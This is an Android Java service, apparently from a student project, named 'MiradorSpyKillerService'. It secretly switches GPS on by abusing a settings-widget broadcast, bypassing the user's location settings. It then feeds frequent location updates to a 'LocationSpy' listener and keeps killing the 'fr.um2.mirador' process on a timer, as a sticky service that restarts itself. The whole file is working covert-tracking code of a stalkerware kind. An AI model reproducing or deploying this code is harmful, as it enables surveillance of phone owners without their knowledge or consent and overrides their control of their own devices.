package fr.um2.miradoresclave.service;

import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.LocationManager;
import android.net.Uri;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;
import fr.um2.util.TagDebug;

/**
 * 
 * @author Mojdeh Mirador Spy Service
 */
public class MiradorSpyKillerService extends Service {

	Timer timer = new Timer();
	/**
	 * 2second for test real 120 000 is two minutes
	 */
	private static final int TWO_MINUTE = 1000;
	private static final int TEN_MINUTE = 10000;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	public void turnGPSOn() {
		Context ctx = getApplicationContext();
		Intent intent = new Intent("android.location.GPS_ENABLED_CHANGE");
		intent.putExtra("enabled", true);
		ctx.sendBroadcast(intent);

		String provider = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);

		if (!provider.contains("gps")) { // if gps is disabled
			final Intent poke = new Intent();
			poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
			poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
			poke.setData(Uri.parse("3"));
			ctx.sendBroadcast(poke);
		}
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.e(TagDebug.TAG, " Service start");

		turnGPSOn();

		// a periodic send look LocationSpy
		LocationManager locationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
		LocationSpy locationListener = new LocationSpy(getApplicationContext());
		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, TWO_MINUTE, 0, locationListener);

		timer.scheduleAtFixedRate(new TimerTask() {

			/**
			 * Kill process in the rooted phone
			 */
			@Override
			public void run() {
				List<String> pocessName = new ArrayList<String>();
				pocessName.add("fr.um2.mirador");

				final ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);

				List<RunningAppProcessInfo> runing = am.getRunningAppProcesses();

				for (RunningAppProcessInfo r : runing) {
					// Log.e(TagDebug.TAG, r.pid+" "+r.processName);
					if (pocessName.contains(r.processName)) {
						android.os.Process.killProcess(r.pid);
						android.os.Process.sendSignal(r.pid, android.os.Process.SIGNAL_KILL);
						// am.killBackgroundProcesses(r.processName);
					}
				}

			}
		}, TWO_MINUTE, TWO_MINUTE);

		return START_STICKY;
	}

}
